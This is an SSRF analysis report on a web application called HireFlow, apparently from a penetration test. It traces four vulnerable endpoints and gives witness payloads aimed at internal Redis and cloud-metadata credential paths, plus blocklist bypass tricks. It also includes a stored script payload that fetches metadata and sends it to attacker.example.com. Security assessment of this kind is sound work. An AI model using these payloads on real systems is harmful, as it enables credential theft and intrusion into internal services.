# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Four high-confidence server-side request forgery vulnerabilities were identified across three distinct functional areas of the HireFlow application. The dominant pattern is the complete absence of URL validation before passing user-supplied URLs to outbound HTTP clients. One additional false-positive candidate (dispute evidence URL) was confirmed safe from SSRF as the URL is only stored — not fetched — server-side.
- **Purpose of this Document:** This report provides the strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

**Vulnerabilities Confirmed:** 4 (SSRF-VULN-01 through SSRF-VULN-04)
**Externally Exploitable:** 4 (all require only a registered user account — obtainable via public `POST /api/auth/register`)
**Safe Paths Analyzed:** 1 (`POST /api/disputes/:id/evidence` — URL stored only, not fetched)

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: No URL Validation Before Outbound HTTP Request (Classic SSRF)

- **Description:** Two endpoints (`POST /api/webhooks/test` and `GET /api/integrations/import`) accept a user-supplied URL and pass it directly to Node.js built-in `http`/`https` modules with zero validation. No allowlist, no blocklist, no IP range check, no protocol restriction beyond what the `URL` parser rejects.
- **Implication:** An authenticated attacker can force the server to make HTTP requests to any destination: internal service ports (Redis on 6379, PostgreSQL on 5432, MongoDB on 27017, MinIO on 9000), cloud metadata endpoints (169.254.169.254), or arbitrary external hosts. The full HTTP response body is returned to the attacker, making this non-blind SSRF.
- **Representative Findings:** `SSRF-VULN-01`, `SSRF-VULN-02`

### Pattern 2: Incomplete Blocklist (Partial Defense Bypass)

- **Description:** The link-preview endpoint (`POST /api/messages/conversations/:id/link-preview`) applies a blocklist but restricts it to only `localhost` and `127.0.0.1`. The entire private/reserved IP space is left unrestricted: 127.0.0.2–127.255.255.255, 0.0.0.0, ::1 (IPv6), 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, and 169.254.0.0/16 (cloud metadata).
- **Implication:** Attackers bypass the filter trivially by using alternate localhost representations, any private network IP, or the cloud metadata IP. Because the HTML meta-tag content of the fetched page is returned to the attacker, this is also non-blind SSRF.
- **Representative Finding:** `SSRF-VULN-03`

### Pattern 3: HTML Injection into Headless Browser (Puppeteer SSRF)

- **Description:** The invoice generation endpoint (`GET /api/contracts/:id/invoice`) renders an HTML page from a template that directly interpolates user-controlled strings (`display_name`, `milestone.title`) without sanitization. The page is then loaded by Puppeteer/Chromium launched with `--no-sandbox --disable-setuid-sandbox`. With `waitUntil: 'networkidle0'`, the browser waits for all injected network requests to complete.
- **Implication:** An attacker who controls the `display_name` field (via `PUT /api/users/:id`) can inject `<script>` tags or `<img src=...>` tags causing Chromium to issue outbound requests to internal services, metadata endpoints, or attacker-controlled servers. Because Chromium has no sandbox and the container has broad network access, this provides an alternative SSRF channel via a browser execution context.
- **Representative Finding:** `SSRF-VULN-04`

---

## 3. Strategic Intelligence for Exploitation

- **HTTP Client Libraries:**
  - `http` / `https` (Node.js built-ins) — used in `webhook.service.js` (both `testWebhook` and `importProfile`) and in `messaging.service.js` (`fetchLinkPreview`).
  - `puppeteer` (Chromium headless browser) — used in `utils/pdf.js` for invoice HTML rendering.

- **Request Architecture:**
  - Webhook test/import: URL parsed with `new URL(url)`, hostname/port extracted directly, passed to `transport.request()` with no IP or hostname validation. Response body collected and returned to the API caller.
  - Link-preview: URL parsed with `new URL(url)`, protocol checked (http/https only), hostname compared against a two-entry blocklist (`localhost`, `127.0.0.1`), then `client.get(url)` issued. Response is parsed for HTML meta tags and returned.
  - PDF invoice: User fields (`display_name`, `milestone.title`) interpolated into an HTML string via template literals with no escaping. The resulting HTML is passed to `page.setContent(html, { waitUntil: 'networkidle0' })`.

- **Internal Services Reachable via SSRF (confirmed from recon/debug endpoint):**
  - PostgreSQL 15: `127.0.0.1:5432` (or `postgres:5432` on the internal Docker network)
  - MongoDB 7: `127.0.0.1:27017` (or `mongodb:27017`)
  - Redis 7: `127.0.0.1:6379` (or `redis:6379`)
  - MinIO S3 API: `127.0.0.1:9000` / MinIO Web UI: `127.0.0.1:9001`
  - MailHog SMTP: `127.0.0.1:1025` / Web UI: `127.0.0.1:8025`
  - Cloud metadata endpoint: `169.254.169.254` (if running in a cloud VM or ECS task)

- **Authentication Barrier:** All four SSRF endpoints require a valid authenticated session or JWT bearer token. However, user registration (`POST /api/auth/register`) is publicly accessible and immediately returns a JWT — no email verification is enforced before the token becomes usable. Therefore, any internet attacker can self-register and immediately exploit all four vulnerabilities.

- **Response Visibility:**
  - `POST /api/webhooks/test`: Returns first 500 bytes of response body (`response` field), HTTP status code.
  - `GET /api/integrations/import`: Returns a JSON-parsed view of the response body (profile fields extracted); parse errors expose raw error message including URL.
  - `POST /api/messages/conversations/:id/link-preview`: Returns title, description, og:image extracted from response HTML; error messages included.
  - `GET /api/contracts/:id/invoice`: Indirect — injected JavaScript can exfiltrate to attacker-controlled server; no direct response channel in the HTTP reply (PDF bytes returned, not Chromium stdout).

---

## 4. Detailed Vulnerability Analysis

### SSRF-VULN-01: Webhook Test — Unrestricted POST SSRF with Full Response Return

**Endpoint:** `POST /api/webhooks/test`
**Authentication:** Authenticated user (any role)
**Parameter:** `url` (JSON request body)

#### Source-to-Sink Trace

1. **Source:** `req.body.url` — user-supplied string, no format restriction.
2. **Route handler** (`src/integrations/webhook.routes.js:48–62`): Checks only that `url` is truthy, then calls `webhookService.testWebhook(url)`.
3. **Service function** (`src/integrations/webhook.service.js:139–189`):
   - `const parsed = new URL(url)` — parses the URL; throws if malformed.
   - `const transport = parsed.protocol === 'https:' ? https : http` — selects transport; **no protocol allowlist**.
   - `hostname: parsed.hostname` — used directly, **no IP or hostname validation whatsoever**.
   - `port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80)` — any port accepted.
4. **Sink:** `transport.request(options, ...)` at `src/integrations/webhook.service.js:165`.
5. **Response:** Body collected, truncated to 500 bytes, returned to caller as `{ success, status, response }`.

#### Sanitizers Encountered

| Check | Present? | Effective? |
|---|---|---|
| Protocol allowlist (http/https only) | No | — |
| IP/CIDR blocklist | No | — |
| Hostname allowlist | No | — |

**Verdict: VULNERABLE (High Confidence)**

#### Witness Payload
```
POST /api/webhooks/test
Authorization: Bearer <token>
Content-Type: application/json

{"url": "http://127.0.0.1:6379/"}
```

---

### SSRF-VULN-02: Profile Import — Unrestricted GET SSRF with JSON Response Exfiltration

**Endpoint:** `GET /api/integrations/import`
**Authentication:** Authenticated user (any role)
**Parameter:** `url` (query string)

#### Source-to-Sink Trace

1. **Source:** `req.query.url` — user-supplied string from query parameter.
2. **Route handler** (`src/integrations/webhook.routes.js:69–83`): Checks only that `url` is truthy, then calls `webhookService.importProfile(url)`.
3. **Service function** (`src/integrations/webhook.service.js:196–248`):
   - `const parsed = new URL(url)` — parses; throws if malformed.
   - `const transport = parsed.protocol === 'https:' ? https : http` — selects transport.
   - `hostname: parsed.hostname` — used directly with no validation.
   - Any port number accepted.
4. **Sink:** `transport.request(options, ...)` at `src/integrations/webhook.service.js:213`.
5. **Response:** Full response body is JSON-parsed and profile fields (`display_name`, `bio`, `skills`, `location`, `website`, `avatar_url`) returned to caller. Parse failures return error message containing the target URL.

#### Sanitizers Encountered

| Check | Present? | Effective? |
|---|---|---|
| Protocol allowlist (http/https only) | No | — |
| IP/CIDR blocklist | No | — |
| Hostname allowlist | No | — |

**Verdict: VULNERABLE (High Confidence)**

#### Witness Payload
```
GET /api/integrations/import?url=http://169.254.169.254/latest/meta-data/
Authorization: Bearer <token>
```

---

### SSRF-VULN-03: Link Preview — Incomplete Blocklist SSRF with HTML Data Exfiltration

**Endpoint:** `POST /api/messages/conversations/:id/link-preview`
**Authentication:** Authenticated user (any role)
**Parameter:** `url` (JSON request body)

#### Source-to-Sink Trace

1. **Source:** `req.body.url` — user-supplied string.
2. **Controller** (`src/messaging/messaging.controller.js:124–139`): Extracts `url`, checks truthy, calls `messagingService.fetchLinkPreview(url)`.
3. **Service function** (`src/messaging/messaging.service.js:367–421`):
   - `parsed = new URL(url)` — parses; throws on malformed input.
   - **Protocol check:** `if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') → reject` — restricts to http/https only. (Effective for protocol abuse.)
   - **Blocklist check:** `if (parsed.hostname === 'localhost' || parsed.hostname === '127.0.0.1') → reject` — **ONLY two entries; trivially bypassed.**
   - `var client = parsed.protocol === 'https:' ? https : http`
4. **Sink:** `client.get(url, { timeout: 5000 }, ...)` at `src/messaging/messaging.service.js:387`.
5. **Response:** HTML body is scraped for `<title>`, `og:title`, `og:description`, `og:image`; returned as `{ url, title, description, image }`.

#### Sanitizers Encountered

| Check | Present? | Effective? |
|---|---|---|
| Protocol allowlist (http/https only) | Yes | Effective — blocks file://, gopher://, etc. |
| `localhost` hostname block | Yes (partial) | **Insufficient — only 2 literal strings checked** |
| Full 127.0.0.0/8 range check | No | — |
| 169.254.0.0/16 (cloud metadata) | No | — |
| RFC 1918 (10/8, 172.16/12, 192.168/16) | No | — |
| IPv6 loopback (::1) | No | — |
| 0.0.0.0 | No | — |
| DNS rebinding protection | No | — |

**Bypass techniques:** `127.0.0.2`, `0.0.0.0`, `::1`, `10.x.x.x`, `192.168.x.x`, `172.16–31.x.x`, `169.254.169.254`, DNS rebinding.

**Verdict: VULNERABLE (High Confidence)**

#### Witness Payload
```
POST /api/messages/conversations/1/link-preview
Authorization: Bearer <token>
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

---

### SSRF-VULN-04: Invoice PDF Generation — Puppeteer HTML Injection SSRF

**Endpoint:** `GET /api/contracts/:id/invoice`
**Authentication:** Authenticated user (any role — no ownership check on contract)
**Input Vector:** `display_name` field (set via `PUT /api/users/:id`) or milestone `title` (set via `POST /api/contracts/:id/milestones`)

#### Source-to-Sink Trace

1. **Source (stored):** `display_name` set by user via `PUT /api/users/:id`; `milestone.title` set via `POST /api/contracts/:id/milestones`. Stored in PostgreSQL without HTML encoding.
2. **Invoice controller** (`src/contracts/contracts.controller.js`): Calls `contractsService.generateInvoice(contractId)` — no ownership check (any authenticated user can trigger invoice for any contractId due to missing authz).
3. **Service** (`src/contracts/contracts.service.js:442, 447`): Constructs `invoiceData` with `clientName: client.display_name` and `description: m.title` directly from DB rows.
4. **PDF utility** (`src/utils/pdf.js:32–90`): `buildInvoiceHTML(data)` interpolates `data.clientName` and `item.description` into HTML template literals — **zero HTML encoding**.
5. **Sink:** `page.setContent(html, { waitUntil: 'networkidle0' })` at `src/utils/pdf.js:16`.
   - Chromium launched with `--no-sandbox --disable-setuid-sandbox` (pdf.js lines 7–10) — **sandbox entirely disabled**.
   - `waitUntil: 'networkidle0'` blocks until all injected requests finish.

#### Sanitizers Encountered

| Check | Present? | Effective? |
|---|---|---|
| HTML escaping of user fields before template | No | — |
| CSP in generated page | No | — |
| Chromium sandbox | No (--no-sandbox) | — |
| Network access restriction for Chromium | No | — |

**Attack Flow:**
1. Attacker registers account and sets `display_name` to an XSS/SSRF payload (e.g., `<script>` that fetches an internal URL and exfiltrates data out-of-band).
2. Attacker (or exploiting IDOR on the invoice endpoint) triggers `GET /api/contracts/:id/invoice` for a contract where the attacker is the client.
3. Puppeteer renders the HTML; injected JavaScript executes in the sandboxless Chromium context.
4. Chromium issues HTTP requests to internal services or cloud metadata endpoints.
5. Exfiltration occurs out-of-band to attacker's server.

**Verdict: VULNERABLE (High Confidence)**

#### Witness Payload (set display_name then trigger invoice)
```
PUT /api/users/:id
Authorization: Bearer <token>
Content-Type: application/json

{
  "display_name": "<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>{new Image().src='http://attacker.example.com/?x='+btoa(d)})</script>"
}
```
Then: `GET /api/contracts/:id/invoice` (where :id is a contract the attacker participates in)

---

## 5. Secure by Design: Validated Components

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Dispute Evidence URL storage | `POST /api/disputes/:id/evidence` / `src/disputes/disputes.service.js:274–294` | `evidence_url` is stored in the PostgreSQL JSONB `evidence` column; no server-side HTTP fetch is performed on this URL at any point. No outbound request is issued. Party check enforced in controller (`disputes.controller.js:100–107`). | SAFE from SSRF |

